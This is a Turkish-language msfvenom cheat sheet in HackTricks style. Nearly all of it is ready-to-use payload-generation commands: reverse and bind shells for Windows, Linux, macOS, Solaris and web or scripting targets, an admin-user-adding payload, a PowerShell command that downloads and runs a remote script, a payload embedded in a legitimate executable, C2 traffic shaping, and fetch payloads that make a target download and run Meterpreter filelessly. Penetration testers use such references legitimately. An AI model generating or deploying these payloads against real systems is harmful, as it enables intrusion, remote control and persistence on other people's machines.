# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Temel msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Payload architecture'ını seçmek için `-a`, hedef platformunu seçmek için `--platform` kullanın.<sup>[[1]](#references)</sup>

## Listeleme
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Bu komutlar, kurulu framework'te kullanılabilen payload ve encoder modüllerini listeler.<sup>[[1]](#references)</sup>

## Shellcode oluştururken kullanılan yaygın parametreler
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Burada gösterilen flags, bad characters, output format, encoder ve encoding iterations seçeneklerini belirler.<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter traffic shaping

Metasploit 6.5, staged ve stageless reverse HTTP(S) Meterpreter payload'larına `MALLEABLEC2` seçeneğini ekledi. Profile; URI'leri, user agent'ları, request/response header'larını, connection-ID yerleşimini ve desteklenen body encoding/wrapper'larını değiştirebilir. Hem oluşturulan payload hem de handler **aynı yerel profile** yüklemelidir. Staged payload'ın Meterpreter stage için yaptığı ilk request şekillendirilmez; bu nedenle ilk request'in de profile uyması gerektiğinde `windows/x64/meterpreter_reverse_https` gibi bir stageless payload tercih edin.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Eşleşen handler'ı aynı payload ve profile ile yapılandırın:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Yalnızca uygulanmış olarak belgelenen direktifler trafiği etkiler; desteklenmeyen profil blokları başarıyla ayrıştırılabilir, ancak herhangi bir etkileri olmayabilir.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Kullanıcı Oluştur
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Komut Çalıştırma**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding AV evasion değildir:** `x86/shikata_ga_nai` gibi encoder'lar öncelikle bad-character kısıtlamalarını karşılamak için kullanışlıdır. Tekrarlanan encoding, güvenilir bir AV-evasion tekniği değildir.<sup>[[1]](#references)</sup>

### Çalıştırılabilir dosyanın içine gömülü
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payload'ları**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Web Based Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Betik Dili payload'ları**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapter'ları

Fetch payload'ları, mevcut bir target utility'nin underlying native payload'ı indirmesini ve çalıştırmasını sağlayan bir command üretir. İsimleri `cmd/<platform>/<fetch-protocol>/<served-payload>` formatını izler; HTTP(S), SMB ve TFTP adapter'ları kullanılabilir ve downloader seçenekleri target platform'a bağlıdır.<sup>[[2]](#references)</sup>

Örneğin, port 8080'den bir x64 Meterpreter payload'ı alan ve bağlantıyı port 4444 üzerinden geri kuran bir Linux `wget` command'i oluşturun:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Aynı ayarlarla **fetch handler**'ı başlatın; bu, oluşturulan ELF'yi barındırır ve sunulan Meterpreter payload'u için handler'ı da başlatır:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Kullanışlı bağımlı seçenekler arasında, desteklendiğinde daha kısa bir HTTP(S) komutu üretmek için `FETCH_PIPE=true` ve anonim bir file descriptor üzerinden Linux ELF çalıştırmak için `FETCH_FILELESS=shell`, `shell-search` veya `python3.8+` bulunur. Fileless modlar Linux kernel 3.17 veya sonraki sürümlerini gerektirir; desteklenen kombinasyonlar değiştiğinden, tam adapter'ı `msfvenom -p <FETCH_PAYLOAD> --list-options` ile inceleyin.<sup>[[2]](#references)</sup>



## References

- [1] [msfvenom nasıl kullanılır](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Fetch Payloads nasıl kullanılır](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
